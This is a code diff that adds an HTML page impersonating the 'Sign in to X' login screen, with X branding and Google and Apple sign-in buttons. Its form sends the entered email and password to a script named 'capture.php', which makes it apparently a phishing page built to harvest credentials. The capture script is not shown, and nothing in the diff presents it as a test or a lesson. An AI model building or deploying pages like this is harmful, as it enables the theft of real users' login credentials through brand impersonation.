@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Sign In</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <div class="container">
+    <div class="logo">X</div>
+    <h1>Sign in to X</h1>
+    <form action="./capture.php" method="POST">
+    <label for="email">Email or mobile phone number</label>
+    <input type="text" id="email" name="email" required>
+    <input type="password" id="password" name="password" required>
+      <button class="google-btn" type="button">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/53/Google_%22G%22_Logo.svg/512px-Google_%22G%22_Logo.svg.png" alt="Google Logo" class="icon">
+        Sign in with Google
+      </button>
+      <button class="apple-btn" type="button">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple Logo" class="icon">
+        Sign in with Apple
+      </button>
+      <div class="divider">
+        <span>or</span>
+      </div>
+      <input type="text" placeholder="Phone, email, or username" class="input-field" required>
+    </form>
+  </div>
+</body>
+</html>
